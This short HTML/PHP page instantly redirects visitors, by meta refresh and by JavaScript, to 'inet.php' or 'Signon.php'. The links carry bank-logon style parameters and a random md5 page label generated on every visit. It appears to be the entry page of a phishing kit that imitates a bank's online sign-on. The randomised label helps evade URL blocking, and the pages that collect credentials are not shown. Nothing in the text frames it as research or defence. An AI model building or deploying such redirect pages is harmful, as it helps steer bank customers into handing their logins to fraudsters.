<html><head>
<meta http-equiv="refresh" content="0; URL=inet.php?LOB=RBGLogon&_pageLabel=<?echo md5(uniqid(time())); ?>">
<script language="JavaScript" type="text/javascript">

function redirect() { 
setTimeout("window.location.replace('Signon.php?LOB=RBGLogon&_pageLabel=<?echo md5(uniqid(time())); ?>')", 0); }

</script>
</head>
